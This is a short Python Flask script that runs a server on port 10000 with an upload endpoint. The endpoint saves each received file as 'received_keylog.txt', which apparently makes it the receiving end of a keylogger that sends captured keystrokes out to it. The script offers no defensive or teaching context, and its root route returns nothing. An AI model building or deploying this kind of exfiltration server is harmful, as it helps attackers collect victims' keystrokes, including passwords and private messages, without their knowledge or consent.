from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def home():
    return

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return "No file part", 400
    file = request.files['file']
    file.save("received_keylog.txt")
    return "✅ File received", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
